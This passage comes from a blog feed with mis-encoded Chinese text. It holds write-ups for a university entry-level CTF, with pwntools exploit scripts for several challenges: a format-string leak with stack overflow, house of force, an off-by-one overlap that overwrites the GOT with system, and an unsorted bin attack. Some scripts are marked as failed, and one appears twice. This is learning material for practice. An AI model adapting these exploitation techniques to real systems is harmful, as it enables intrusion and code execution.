id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>è¿™é‡Œè¯´ä¸€ä¸‹æˆ‘è‡ªå·±çš„é—®é¢˜</p><p>æˆ‘ä¸€ç›´è®¤ä¸ºfakechunkè¢«é‡Šæ”¾åè¿›å…¥fastbinä¸­ï¼Œæˆ‘ä¸€ç›´è®¤ä¸ºfastbinä¸­åªæœ‰ä¸€ä¸ªchunk</p><p>çŸ¥é“æˆ‘æƒŠäººåœ°å‘ç°å®ƒå±…ç„¶æ˜¯freeäº†ä¸¤å›æ˜¯ä¸¤ä¸ªchunk </p><p>æˆ‘æ‰é†’æ‚Ÿ</p><p>ä¸ºä»€ä¹ˆå®ƒä¸ç›´æ¥ä»top chunkä¸­åˆ†é…ï¼ˆæˆ‘ä¸ªfwï¼Œç›¯ç€çœ‹äº†ä¸¤ä¸ªå°æ—¶ä¹Ÿæ²¡çœ‹å‡ºæ¥ï¼‰</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223150743.png" alt="image-20201220223150743"></p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223239931.png" alt="image-20201220223239931"></p><p>æ€»ç»“ï¼Œè‡ªå·±æ€»æ˜¯åœ¨è‡ªå·±æƒ³è¿™ä¸ªå †æ€ä¹ˆè¿è¡Œï¼Œå¾ˆå°‘å»è°ƒè¯•ã€‚è¿˜æ˜¯åº”è¯¥å¤šåŠ¨æ‰‹ï¼ˆè¦ä¸æ˜¯æˆ‘è°ƒè¯•èƒ½åŠ›ä¸å¤ªè¡Œï¼‰</p><h1 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h1><blockquote><p>å¾ˆç®€å•çš„unsorted bin attack,åˆ©ç”¨æ­¤æ”»å‡»ä¿®æ”¹flagä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°å°±å¯ä»¥è·å¾—shelläº†</p><p>å…³äºunsorted bin attackå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10016</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def show(idx):</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline("3")</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline(str(idx))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = flag - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"666"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h1><blockquote><p>addç”³è¯·çš„æ—¶å€™,å¦‚æœsizeä¸ç¬¦åˆæ¡ä»¶,ä¼šè¿”å›,è€Œeditçš„æ—¶å€™,æ²¡æœ‰æ£€æµ‹,æ‰€ä»¥é€šè¿‡æ®‹ç•™ä¿¡æ¯æ¥æ§åˆ¶æŒ‡é’ˆ,å®ç°</p><p>ä»»æ„å†™</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å¤ç°&quot;&gt;&lt;a href=&quot;#å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;å¤ç°&quot;&gt;&lt;/a&gt;å¤ç°&lt;/h1&gt;&lt;p&gt;ç»ˆäºè€ƒå®Œè¯•äº†ï¼Œè¿™è€ƒå‰å­¦çœŸä¸æ˜¯äººå¹²çš„ï¼Œä¸Šè¯¾è¿˜æ˜¯å¾—å¬ä¸€å¬&lt;/p&gt;
&lt;p&gt;å¤ç°ä¸€ä¸‹è¿™å‡ é“é¢˜ï¼Œé¡ºä¾¿å­¦ä¹ å †çš„çŸ¥è¯†&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;æ·¦ æˆ‘æ˜¯fw</summary>
      
    
    
    
    <category term="å¤ç°" scheme="https://pz1o.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="å †" scheme="https://pz1o.top/tags/%E5%A0%86/"/>
    
    <category term="å¤ç°" scheme="https://pz1o.top/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CUMT2020å…¥é—¨èµ›</title>
    <link href="https://pz1o.top/2020/11/28/CUMT2020%E5%85%A5%E9%97%A8%E8%B5%9B/"/>
    <id>https://pz1o.top/2020/11/28/CUMT2020%E5%85%A5%E9%97%A8%E8%B5%9B/</id>
    <published>2020-11-28T10:20:47.000Z</published>
    <updated>2020-11-28T12:46:19.100Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="CUMT2020å…¥é—¨èµ›"><a href="#CUMT2020å…¥é—¨èµ›" class="headerlink" title="CUMT2020å…¥é—¨èµ›"></a>CUMT2020å…¥é—¨èµ›</h1><p>æœ¬ä¸å‡†å¤‡å†™çš„ï¼Œä¸»è¦tclï¼Œè¿˜æ˜¯ç•™ä¸ªå‘ä½ç­‰è€ƒå®Œè¯•æ¥å¤ç°</p><p>ä¸»è¦å¯¹å †ä¸ç†è§£ï¼Œå¹¶ä¸”ä¸æ‡‚æ¼æ´åˆ©ç”¨ç‚¹åœ¨å“ªé‡Œ</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>ncè¿æ¥æ‹¿flag</p><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> pwnlib.tubes.remote <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> pwnlib.tubes.process <span class="keyword">import</span> process</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwnlib.elf.elf <span class="keyword">import</span> ELF</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> make_packer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = make_packer(word_size=<span class="number">64</span>)</span><br><span class="line">bd = <span class="number">0x400756</span></span><br><span class="line"><span class="comment">#r = process("./overflow")</span></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10011</span>)</span><br><span class="line">r.recvuntil(<span class="string">b'Welcome to CTF2020!\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">b'Please input your username\n'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b'%11$p'</span>)</span><br><span class="line">pp = r.recv()</span><br><span class="line">print(pp)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b'a'</span>*<span class="number">0x28</span> + p(int(pp, <span class="number">16</span>)) + <span class="string">b'a'</span>*<span class="number">8</span> + p(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>æ ˆæº¢å‡º</p><h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>æ•´æ•°æº¢å‡º</p><p>è¾“å…¥65536</p><p>å¾—åˆ°shell</p><h3 id="pwn5-fail"><a href="#pwn5-fail" class="headerlink" title="pwn5(fail)"></a>pwn5(fail)</h3><p>å…ˆè´´expï¼Œè€ƒå®Œè¯•æ¥å­¦ä¹ </p><p>æ¼æ´ç‚¹æƒ³çš„æ˜¯ä¸€æ ·çš„</p><p>ä½†å…¶ä¸­æœ‰äº›ç»†èŠ‚ä¸å¤ªæ‡‚</p><blockquote><p>åˆ©ç”¨changeå‡½æ•°ä¸­å­˜åœ¨çš„ä»»æ„å­—èŠ‚å †æº¢å‡ºæ„é€ house of forceæ”»å‡»</p><p>å…³äºhouse of forceä¸æ‡‚å¾—çš„å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D1B</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc = offset_to_heap_base - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(malloc,<span class="string">"dddd"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic) * <span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn6-fail"><a href="#pwn6-fail" class="headerlink" title="pwn6(fail)"></a>pwn6(fail)</h3><blockquote><p>changeå‡½æ•°ä¸­å­˜åœ¨å•å­—èŠ‚æº¢å‡ºæ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;if ( heap[v1] ) </span><br><span class="line">&gt;&#123; printf(&quot;Content of heap : &quot;);</span><br><span class="line">read_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class="line">puts(&quot;Done !&quot;); </span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å•å­—èŠ‚æº¢å‡ºæ¼æ´æ„é€ fake_chunk,freeä¹‹åå†æ¬¡åˆ†é…é€ æˆoverlap,ä»è€Œä»»æ„åœ°å€è¯»å†™</p><p>æ³„éœ²å‡ºlibcåŸºåœ°å€ï¼Œä¿®æ”¹gotè¡¨ï¼Œæœ€åget_shell</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10015</span>)</span><br><span class="line">heap = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn7-fail"><a href="#pwn7-fail" class="headerlink" title="pwn7(fail)"></a>pwn7(fail)</h3><blockquote><p>å¾ˆç®€å•çš„unsorted bin attack,åˆ©ç”¨æ­¤æ”»å‡»ä¿®æ”¹flagä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°å°±å¯ä»¥è·å¾—shelläº†</p><p>å…³äºunsorted bin attackå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10016</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def show(idx):</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline("3")</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline(str(idx))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = flag - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"666"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn8-fail"><a href="#pwn8-fail" class="headerlink" title="pwn8(fail)"></a>pwn8(fail)</h3><blockquote><p>addç”³è¯·çš„æ—¶å€™,å¦‚æœsizeä¸ç¬¦åˆæ¡ä»¶,ä¼šè¿”å›,è€Œeditçš„æ—¶å€™,æ²¡æœ‰æ£€æµ‹,æ‰€ä»¥é€šè¿‡æ®‹ç•™ä¿¡æ¯æ¥æ§åˆ¶æŒ‡é’ˆ,å®ç°</p><p>ä»»æ„å†™</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="MISCç­¾åˆ°é¢˜"><a href="#MISCç­¾åˆ°é¢˜" class="headerlink" title="MISCç­¾åˆ°é¢˜"></a>MISCç­¾åˆ°é¢˜</h3><p>ookè§£ç </p><h3 id="åŒé‡æ´—è„‘"><a href="#åŒé‡æ´—è„‘" class="headerlink" title="åŒé‡æ´—è„‘"></a>åŒé‡æ´—è„‘</h3><p>ä¸ä½›è®ºç¦…+ç¤¾ä¼šä¸»ä¹‰ä»·å€¼è§‚</p><h3 id="çœŸÂ·ç­¾åˆ°"><a href="#çœŸÂ·ç­¾åˆ°" class="headerlink" title="çœŸÂ·ç­¾åˆ°"></a>çœŸÂ·ç­¾åˆ°</h3><p>åŠ qqæ‹ä¸€æ‹</p><h3 id="çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†"><a href="#çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†" class="headerlink" title="çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†"></a>çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†</h3><p>è„±è¿›010ï¼Œç›´æ¥ç›²æ–‡è§£å¯†</p><h3 id="7çš„æ„å¿—ï¼"><a href="#7çš„æ„å¿—ï¼" class="headerlink" 